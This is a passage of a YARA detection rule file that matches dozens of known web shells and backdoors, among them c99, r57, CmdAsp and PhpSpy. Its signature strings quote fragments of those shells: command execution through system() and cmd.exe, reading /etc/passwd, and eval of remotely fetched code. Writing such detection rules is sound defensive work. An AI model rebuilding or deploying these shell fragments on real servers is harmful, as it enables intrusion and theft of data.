$s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
$s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword
condition:
all of them
}
rule SSC_multiple_webshells_0011 {
meta:
description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_w_php_php_c99madshell_v2_1_php_php_wacking_php_php_SsEs_php_php_SpecialShell_99_php_php"
hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
hash1 = "3ca5886cd54d495dc95793579611f59a"
hash2 = "9c5bb5e3a46ec28039e8986324e42792"
hash3 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
hash4 = "09609851caa129e40b0d56e90dfc476c"
strings:
$s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA"
$s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec"
condition:
1 of them
}
rule SSC_FSO_s_ajan_2 {
meta:
description = "Webshells Auto-generated - file ajan.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "22194f8c44524f80254e1b5aec67b03e"
strings:
$s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
$s3 = "/file.zip"
condition:
all of them
}
rule SSC_webshell_php_cmd {
meta:
description = "Web Shell - file cmd.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "c38ae5ba61fd84f6bbbab98d89d8a346"
strings:
$s0 = "if($_GET['cmd']) {" fullword
$s1 = "// cmd.php = Command Execution" fullword
$s7 = "  system($_GET['cmd']);" fullword
condition:
all of them
}
rule SSC_FeliksPack3___PHP_Shells_xIShell {
meta:
description = "Webshells Auto-generated - file xIShell.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "997c8437c0621b4b753a546a53a88674"
strings:
$s3 = "if (!$nix) { $xid = implode(explode(\"\\\\\",$xid),\"\\\\\\\\\");}echo (\"<td><a href='Java"
condition:
all of them
}
rule SSC_webshell_sig_404super {
meta:
description = "Web shells - generated from file 404super.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "7ed63176226f83d36dce47ce82507b28"
strings:
$s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
$s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
$s7 = "//http://require.duapp.com/session.php" fullword
$s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
$s12 = "//define('pass','123456');" fullword
$s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO"
condition:
1 of them
}
rule SSC_webshell_MySQL_Web_Interface_Version_0_8 {
meta:
description = "Web Shell - file MySQL Web Interface Version 0.8.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "36d4f34d0a22080f47bb1cb94107c60f"
strings:
$s2 = "href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>"
condition:
all of them
}
rule SSC_webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit {
meta:
description = "Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
strings:
$s1 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
condition:
all of them
}
rule SSC_HYTop_DevPack_upload {
meta:
description = "Webshells Auto-generated - file upload.asp"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "b09852bda534627949f0259828c967de"
strings:
$s0 = "<!-- PageUpload Below -->"
condition:
all of them
}
rule SSC_perlbot_pl {
meta:
description = "Semi-Auto-generated  - file perlbot.pl.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "7e4deb9884ffffa5d82c22f8dc533a45"
strings:
$s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
$s1 = "#Acesso a Shel - 1 ON 0 OFF"
condition:
1 of them
}
rule SSC_WebShell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit {
meta:
description = "PHP Webshells Github Archive - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
author = "Florian Roth"
hash = "b2b797707e09c12ff5e632af84b394ad41a46fa4"
strings:
$s4 = "$liz0zim=shell_exec($_POST[liz0]); " fullword
$s6 = "$liz0=shell_exec($_POST[baba]); " fullword
$s9 = "echo \"<b><font color=blue>Liz0ziM Private Safe Mode Command Execuriton Bypass E"
$s12 = " :=) :</font><select size=\"1\" name=\"liz0\">" fullword
$s13 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
condition:
1 of them
}
rule SSC_webshell_webshells_new_JSP {
meta:
description = "Web shells - generated from file JSP.jsp"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "495f1a0a4c82f986f4bdf51ae1898ee7"
strings:
$s1 = "void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i"
$s5 = "bw.write(z2);bw.close();sb.append(\"1\");}else if(Z.equals(\"E\")){EE(z1);sb.app"
$s11 = "if(Z.equals(\"A\")){String s=new File(application.getRealPath(request.getRequest"
condition:
1 of them
}
rule SSC_WebShell_go_shell {
meta:
description = "PHP Webshells Github Archive - file go-shell.php"
author = "Florian Roth"
hash = "3dd85981bec33de42c04c53d081c230b5fc0e94f"
strings:
$s0 = "#change this password; for power security - delete this file =)" fullword
$s2 = "if (!defined$param{cmd}){$param{cmd}=\"ls -la\"};" fullword
$s11 = "open(FILEHANDLE, \"cd $param{dir}&&$param{cmd}|\");" fullword
$s12 = "print << \"[kalabanga]\";" fullword
$s13 = "<title>GO.cgi</title>" fullword
condition:
1 of them
}
rule SSC_FSO_s_c99 {
meta:
description = "Webshells Auto-generated - file c99.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "5f9ba02eb081bba2b2434c603af454d0"
strings:
$s2 = "\"txt\",\"conf\",\"bat\",\"sh\",\"js\",\"bak\",\"doc\",\"log\",\"sfc\",\"cfg\",\"htacce"
condition:
all of them
}
rule SSC_webshell_cmd_win32 {
meta:
description = "Web Shell - file cmd_win32.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "cc4d4d6cc9a25984aa9a7583c7def174"
strings:
$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam"
$s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
condition:
2 of them
}
rule SSC_byloader {
meta:
description = "Webshells Auto-generated - file byloader.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "0f0d6dc26055653f5844ded906ce52df"
strings:
$s0 = "SYSTEM\\CurrentControlSet\\Services\\NtfsChk"
$s1 = "Failure ... Access is Denied !"
$s2 = "NTFS Disk Driver Checking Service"
$s3 = "Dumping Description to Registry..."
$s4 = "Opening Service .... Failure !"
condition:
all of them
}
rule SSC_WebShell_Worse_Linux_Shell {
meta:
description = "PHP Webshells Github Archive - file Worse Linux Shell.php"
author = "Florian Roth"
hash = "64623ab1246bc8f7d256b25f244eb2b41f543e96"
strings:
$s4 = "if( $_POST['_act'] == \"Upload!\" ) {" fullword
$s5 = "print \"<center><h1>#worst @dal.net</h1></center>\";" fullword
$s7 = "print \"<center><h1>Linux Shells</h1></center>\";" fullword
$s8 = "$currentCMD = \"ls -la\";" fullword
$s14 = "print \"<tr><td><b>System type:</b></td><td>$UName</td></tr>\";" fullword
$s19 = "$currentCMD = str_replace(\"\\\\\\\\\",\"\\\\\",$_POST['_cmd']);" fullword
condition:
2 of them
}
rule SSC_WebShell_NTDaddy_v1_9 {
meta:
description = "PHP Webshells Github Archive - file NTDaddy v1.9.php"
author = "Florian Roth"
hash = "79519aa407fff72b7510c6a63c877f2e07d7554b"
strings:
$s2 = "|     -obzerve : mr_o@ihateclowns.com |" fullword
$s6 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
$s13 = "<form action=ntdaddy.asp method=post>" fullword
$s17 = "response.write(\"<ERROR: THIS IS NOT A TEXT FILE>\")" fullword
condition:
2 of them
}
rule SSC_Sincap_php_php {
meta:
description = "Semi-Auto-generated  - file Sincap.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "b68b90ff6012a103e57d141ed38a7ee9"
strings:
$s0 = "$baglan=fopen(\"/tmp/$ekinci\",'r');"
$s2 = "$tampon4=$tampon3-1"
$s3 = "@aventgrup.net"
condition:
2 of them
}
rule SSC_webshell_Antichat_Shell_v1_3_2 {
meta:
description = "Web Shell - file Antichat Shell v1.3.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "40d0abceba125868be7f3f990f031521"
strings:
$s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m"
condition:
all of them
}
rule SSC_WebShell__PH_Vayv_PHVayv_PH_Vayv {
meta:
description = "PHP Webshells Github Archive - from files PH Vayv.php, PHVayv.php, PH_Vayv.php"
author = "Florian Roth"
super_rule = 1
hash0 = "b51962a1ffa460ec793317571fc2f46042fd13ee"
hash1 = "408ac9ca3d435c0f78bda370b33e84ba25afc357"
hash2 = "4003ae289e3ae036755976f8d2407c9381ff5653"
strings:
$s4 = "<form method=\"POST\" action=\"<?echo \"PHVayv.php?duzkaydet=$dizin/$duzenle"
$s12 = "<? if ($ekinci==\".\" or  $ekinci==\"..\") {" fullword
$s17 = "name=\"duzenx2\" value=\"Klas" fullword
condition:
2 of them
}
rule SSC_webshell_asp_Ajan {
meta:
description = "Web Shell - file Ajan.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "b6f468252407efc2318639da22b08af0"
strings:
$s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate"
condition:
all of them
}
rule SSC_CmdAsp_asp {
meta:
description = "Semi-Auto-generated  - file CmdAsp.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "64f24f09ec6efaa904e2492dffc518b9"
strings:
$s0 = "CmdAsp.asp"
$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
$s2 = "-- Use a poor man's pipe ... a temp file --"
$s3 = "maceo @ dogmile.com"
condition:
2 of them
}
rule SSC_multiple_webshells_0001 {
meta:
description = "Semi-Auto-generated  - from files 1.txt, c2007.php.php.txt, c100.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_1_c2007_php_php_c100_php"
hash0 = "44542e5c3e9790815c49d5f9beffbbf2"
hash1 = "d089e7168373a0634e1ac18c0ee00085"
hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"
strings:
$s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
$s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
condition:
1 of them
}
rule SSC_Antichat_Socks5_Server_php_php {
meta:
description = "Semi-Auto-generated  - file Antichat Socks5 Server.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "cbe9eafbc4d86842a61a54d98e5b61f1"
strings:
$s0 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword
$s3 = "#   [+] Domain name address type"
$s4 = "www.antichat.ru"
condition:
1 of them
}
rule SSC_FSO_s_sincap {
meta:
description = "Webshells Auto-generated - file sincap.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "dc5c2c2392b84a1529abd92e98e9aa5b"
strings:
$s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
$s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="
condition:
all of them
}
rule SSC_WebShell_CmdAsp_asp_php {
meta:
description = "PHP Webshells Github Archive - file CmdAsp.asp.php.txt"
author = "Florian Roth"
hash = "cb18e1ac11e37e236e244b96c2af2d313feda696"
strings:
$s1 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword
$s4 = "' Author: Maceo <maceo @ dogmile.com>" fullword
$s5 = "' -- Use a poor man's pipe ... a temp file -- '" fullword
$s6 = "' --------------------o0o--------------------" fullword
$s8 = "' File: CmdAsp.asp" fullword
$s11 = "<-- CmdAsp.asp -->" fullword
$s14 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
$s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword
$s19 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
condition:
4 of them
}
rule SSC_webshell_customize {
meta:
description = "Web Shell - file customize.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "d55578eccad090f30f5d735b8ec530b1"
strings:
$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
condition:
all of them
}
rule SSC_multiple_webshells_0024 {
meta:
description = "Semi-Auto-generated  - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
was = "_antichat_php_php_Fatalshell_php_php_a_gedit_php_php"
hash0 = "128e90b5e2df97e21e96d8e268cde7e3"
hash1 = "b15583f4eaad10a25ef53ab451a4a26d"
hash2 = "ab9c6b24ca15f4a1b7086cad78ff0f78"
strings:
$s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
$s1 = "if($action==\"phpeval\"){" fullword
$s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
$s3 = "$dir=getcwd().\"/\";" fullword
condition:
2 of them
}
rule SSC_webshell_mysqlwebsh {
meta:
description = "Web Shell - file mysqlwebsh.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "babfa76d11943a22484b3837f105fada"
strings:
$s3 = " <TR><TD bgcolor=\"<? echo (!$CONNECT && $action == \"chparam\")?\"#660000\":\"#"
condition:
all of them
}
rule SSC_myshell_php_php {
meta:
description = "Semi-Auto-generated  - file myshell.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "62783d1db52d05b1b6ae2403a7044490"
strings:
$s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
$s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
$s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"
condition:
2 of them
}
rule SSC_Zehir_4_asp {
meta:
description = "Semi-Auto-generated  - file Zehir 4.asp.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "7f4e12e159360743ec016273c3b9108c"
strings:
$s2 = "</a><a href='\"&dosyapath&\"?status=10&dPath=\"&f1.path&\"&path=\"&path&\"&Time="
$s4 = "<input type=submit value=\"Test Et!\" onclick=\""
condition:
1 of them
}
rule SSC__root_040_zip_Folder_deploy {
meta:
description = "Webshells Auto-generated - file deploy.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "2c9f9c58999256c73a5ebdb10a9be269"
strings:
$s5 = "halon synscan 127.0.0.1 1-65536"
$s8 = "Obviously you replace the ip address with that of the target."
condition:
all of them
}
rule SSC_webshell_phpshell3 {
meta:
description = "Web Shell - file phpshell3.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "76117b2ee4a7ac06832d50b2d04070b8"
strings:
$s2 = "<input name=\"nounce\" type=\"hidden\" value=\"<?php echo $_SESSION['nounce'];"
$s5 = "<p>Username: <input name=\"username\" type=\"text\" value=\"<?php echo $userna"
$s7 = "$_SESSION['output'] .= \"cd: could not change to: $new_dir\\n\";" fullword
condition:
2 of them
}
rule SSC_AJAX_FileUpload_webshell {
meta:
description = "AJAX JS/CSS components providing web shell by APT groups"
author = "F.Roth"
date = "12.10.2014"
score = 75
reference = "http://ceso.googlecode.com/svn/web/bko/filemanager/ajaxfileupload.js"
strings:
$a1 = "var frameId = 'jUploadFrame' + id;" ascii
$a2 = "var form = jQuery('<form  action=\"\" method=\"POST\" name=\"' + formId + '\" id=\"' + formId + '\" enctype=\"multipart/form-data\"></form>');" ascii
$a3 = "jQuery(\"<div>\").html(data).evalScripts();" ascii
condition:
all of them
}
rule SSC_STNC_php_php {
meta:
description = "Semi-Auto-generated  - file STNC.php.php.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "2e56cfd5b5014cbbf1c1e3f082531815"
strings:
$s0 = "drmist.ru" fullword
$s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
$s2 = "STNC WebShell"
$s3 = "http://www.security-teams.net/index.php?showtopic="
condition:
1 of them
}
rule SSC_webshell_jsp_guige02 {
meta:
description = "Web Shell - file guige02.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "a3b8b2280c56eaab777d633535baf21d"
strings:
$s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff"
$s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private"
condition:
all of them
}
rule SSC_HYTop2006_rar_Folder_2006X {
meta:
description = "Webshells Auto-generated - file 2006X.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "cf3ee0d869dd36e775dfcaa788db8e4b"
strings:
$s1 = "<input name=\"password\" type=\"password\" id=\"password\""
$s6 = "name=\"theAction\" type=\"text\" id=\"theAction\""
condition:
all of them
}
rule SSC_WebShell_WinX_Shell {
meta:
description = "PHP Webshells Github Archive - file WinX Shell.php"
author = "Florian Roth"
hash = "a94d65c168344ad9fa406d219bdf60150c02010e"
strings:
$s4 = "// It's simple shell for all Win OS." fullword
$s5 = "//------- [netstat -an] and [ipconfig] and [tasklist] ------------" fullword
$s6 = "<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>" fullword
$s13 = "// Created by greenwood from n57" fullword
$s20 = " if (is_uploaded_file($userfile)) {" fullword
condition:
3 of them
}
rule SSC_WebShell_PHANTASMA {
meta:
description = "PHP Webshells Github Archive - file PHANTASMA.php"
author = "Florian Roth"
hash = "cd12d42abf854cd34ff9e93a80d464620af6d75e"
strings:
$s12 = "\"    printf(\\\"Usage: %s [Host] <port>\\\\n\\\", argv[0]);\\n\" ." fullword
$s15 = "if ($portscan != \"\") {" fullword
$s16 = "echo \"<br>Banner: $get <br>\";" fullword
$s20 = "$dono = get_current_user( );" fullword
condition:
3 of them
}
rule SSC_webshell_ASP_zehir4 {
meta:
description = "Web Shell - file zehir4.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "7f4e12e159360743ec016273c3b9108c"
strings:
$s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/"
condition:
all of them
}
rule SSC_webshell_NIX_REMOTE_WEB_SHELL_NIX_REMOTE_WEB_xxx1 {
meta:
description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "0b19e9de790cd2f4325f8c24b22af540"
hash1 = "f3ca29b7999643507081caab926e2e74"
hash2 = "527cf81f9272919bf872007e21c4bdda"
strings:
$s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type="
$s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
$s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
$s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword
condition:
2 of them
}
rule SSC_thelast_orice2 {
meta:
description = "Webshells Auto-generated - file orice2.php"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "aa63ffb27bde8d03d00dda04421237ae"
strings:
$s0 = " $aa = $_GET['aa'];"
$s1 = "echo $aa;"
condition:
all of them
}
rule SSC_Debug_BDoor {
meta:
description = "Webshells Auto-generated - file BDoor.dll"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "e4e8e31dd44beb9320922c5f49739955"
strings:
$s1 = "\\BDoor\\"
$s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
condition:
all of them
}
rule SSC_WebShell_PhpSpy_Ver_2006 {
meta:
description = "PHP Webshells Github Archive - file PhpSpy Ver 2006.php"
author = "Florian Roth"
hash = "34a89e0ab896c3518d9a474b71ee636ca595625d"
strings:
$s2 = "var_dump(@$shell->RegRead($_POST['readregname']));" fullword
$s12 = "$prog = isset($_POST['prog']) ? $_POST['prog'] : \"/c net start > \".$pathname."
$s19 = "$program = isset($_POST['program']) ? $_POST['program'] : \"c:\\winnt\\system32"
$s20 = "$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\\winnt\\backdoor.exe'"
condition:
1 of them
}
rule SSC_webshell_r57shell127_r57_kartal_r57 {
meta:
description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "ae025c886fbe7f9ed159f49593674832"
hash1 = "1d912c55b96e2efe8ca873d6040e3b30"
hash2 = "4108f28a9792b50d95f95b9e5314fa1e"
strings:
$s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
$s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
$s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_"
condition:
2 of them
}
rule SSC_multiple_php_webshells {
meta:
description = "Semi-Auto-generated  - from files multiple_php_webshells"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
super_rule = 1
hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
hash1 = "911195a9b7c010f61b66439d9048f400"
hash2 = "be0f67f3e995517d18859ed57b4b4389"
hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
hash4 = "8023394542cddf8aee5dec6072ed02b5"
hash5 = "eed14de3907c9aa2550d95550d1a2d5f"
hash6 = "817671e1bdc85e04cc3440bbd9288800"
hash7 = "7101fe72421402029e2629f3aaed6de7"
hash8 = "f618f41f7ebeb5e5076986a66593afd1"
strings:
$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
$s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
$s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"
condition:
2 of them
}
rule SSC_webshell_dev_core {
meta:
description = "Web shells - generated from file dev_core.php"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "55ad9309b006884f660c41e53150fc2e"
strings:
$s1 = "if (strpos($_SERVER['HTTP_USER_AGENT'], 'EBSD') == false) {" fullword
$s9 = "setcookie('key', $_POST['pwd'], time() + 3600 * 24 * 30);" fullword
$s10 = "$_SESSION['code'] = _REQUEST(sprintf(\"%s?%s\",pack(\"H*\",'6874"
$s11 = "if (preg_match(\"/^HTTP\\/\\d\\.\\d\\s([\\d]+)\\s.*$/\", $status, $matches))"
$s12 = "eval(gzuncompress(gzuncompress(Crypt::decrypt($_SESSION['code'], $_C"
$s15 = "if (($fsock = fsockopen($url2['host'], 80, $errno, $errstr, $fsock_timeout))"
condition:
1 of them
}
rule SSC_Phyton_Shell_py {
meta:
description = "Semi-Auto-generated  - file Phyton Shell.py.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "92b3c897090867c65cc169ab037a0f55"
strings:
$s1 = "sh_out=os.popen(SHELL+\" \"+cmd).readlines()" fullword
$s2 = "#   d00r.py 0.3a (reverse|bind)-shell in python by fQ" fullword
$s3 = "print \"error; help: head -n 16 d00r.py\"" fullword
$s4 = "print \"PW:\",PW,\"PORT:\",PORT,\"HOST:\",HOST" fullword
condition:
1 of them
}
rule SSC_webshell_php_up : webshell {
meta:
description = "Web Shell - file up.php"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "7edefb8bd0876c41906f4b39b52cd0ef"
strings:
$s0 = "copy($HTTP_POST_FILES['userfile']['tmp_name'], $_POST['remotefile']);" fullword
$s3 = "if(is_uploaded_file($HTTP_POST_FILES['userfile']['tmp_name'])) {" fullword
$s8 = "echo \"Uploaded file: \" . $HTTP_POST_FILES['userfile']['name'];" fullword
condition:
2 of them
}
rule SSC_cgi_python_py {
meta:
description = "Semi-Auto-generated  - file cgi-python.py.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "0a15f473e2232b89dae1075e1afdac97"
strings:
$s0 = "a CGI by Fuzzyman"
$s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + "
$s2 = "values = map(lambda x: x.value, theform[field])     # allows for"
condition:
1 of them
}
rule SSC_webshell_Expdoor_com_ASP {
meta:
description = "Web shells - generated from file Expdoor.com ASP.asp"
author = "Florian Roth"
date = "2014/03/28"
score = 70
hash = "caef01bb8906d909f24d1fa109ea18a7"
strings:
$s4 = "\">www.Expdoor.com</a>" fullword
$s5 = "    <input name=\"FileName\" type=\"text\" value=\"Asp_ver.Asp\" size=\"20\" max"
$s10 = "set file=fs.OpenTextFile(server.MapPath(FileName),8,True)  '" fullword
$s14 = "set fs=server.CreateObject(\"Scripting.FileSystemObject\")   '" fullword
$s16 = "<TITLE>Expdoor.com ASP" fullword
condition:
2 of them
}
rule SSC_WebShell_php_webshells_myshell {
meta:
description = "PHP Webshells Github Archive - file myshell.php"
author = "Florian Roth"
hash = "5bd52749872d1083e7be076a5e65ffcde210e524"
strings:
$s0 = "if($ok==false &&$status && $autoErrorTrap)system($command . \" 1> /tmp/outpu"
$s5 = "system($command . \" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o"
$s15 = "<title>$MyShellVersion - Access Denied</title>" fullword
$s16 = "}$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTT"
condition:
1 of them
}
rule SSC_webshell_807_dm_JspSpyJDK5_m_cofigrue {
meta:
description = "Web Shell - from files 807.jsp, dm.jsp, JspSpyJDK5.jsp, m.jsp, cofigrue.jsp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
super_rule = 1
hash0 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
hash1 = "14e9688c86b454ed48171a9d4f48ace8"
hash2 = "341298482cf90febebb8616426080d1d"
hash3 = "88fc87e7c58249a398efd5ceae636073"
hash4 = "349ec229e3f8eda0f9eb918c74a8bf4c"
strings:
$s1 = "url_con.setRequestProperty(\"REFERER\", \"\"+fckal+\"\");" fullword
$s9 = "FileLocalUpload(uc(dx())+sxm,request.getRequestURL().toString(),  \"GBK\");" fullword
condition:
1 of them
}
rule SSC_WebShell_NCC_Shell {
meta:
description = "PHP Webshells Github Archive - file NCC-Shell.php"
author = "Florian Roth"
hash = "64d4495875a809b2730bd93bec2e33902ea80a53"
strings:
$s0 = " if (isset($_FILES['probe']) and ! $_FILES['probe']['error']) {" fullword
$s1 = "<b>--Coded by Silver" fullword
$s2 = "<title>Upload - Shell/Datei</title>" fullword
$s8 = "<a href=\"http://www.n-c-c.6x.to\" target=\"_blank\">-->NCC<--</a></center></b><"
$s14 = "~|_Team .:National Cracker Crew:._|~<br>" fullword
$s18 = "printf(\"Sie ist %u Bytes gro" fullword
condition:
3 of them
}
rule SSC_webshell_ASP_zehir {
meta:
description = "Web Shell - file zehir.asp"
author = "Florian Roth"
date = "2014/01/28"
score = 70
hash = "0061d800aee63ccaf41d2d62ec15985d"
strings:
$s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&"
condition:
all of them
}
rule SSC_telnet_cgi {
meta:
description = "Semi-Auto-generated  - file telnet.cgi.txt"
author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
hash = "dee697481383052980c20c48de1598d1"
strings:
$s0 = "www.rohitab.com"
$s1 = "W A R N I N G: Private Server"
$s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
$s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"
condition:
1 of them
}
rule SSC_ZXshell2_0_rar_Folder_zxrecv {
meta:
description = "Webshells Auto-generated - file zxrecv.exe"
author = "Yara Bulk Rule Generator by Florian Roth"
hash = "5d3d12a39f41d51341ef4cb7ce69d30f"
strings:
$s0 = "RyFlushBuff"
$s1 = "teToWideChar^FiYP"
$s2 = "mdesc+8F D"
$s3 = "\\von76std"
$s4 = "5pur+virtul"
$s5 = "- Kablto io"
$s6 = "ac#f{lowi8a"
condition:
all of them
}
rule SSC_Webshell_27_9_c66_c99 {
meta:
description = "Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php ..."
author = "Florian Roth"
reference = "https://github.com/nikicat/web-malware-collection"
date = "2016-01-11"
score = 70
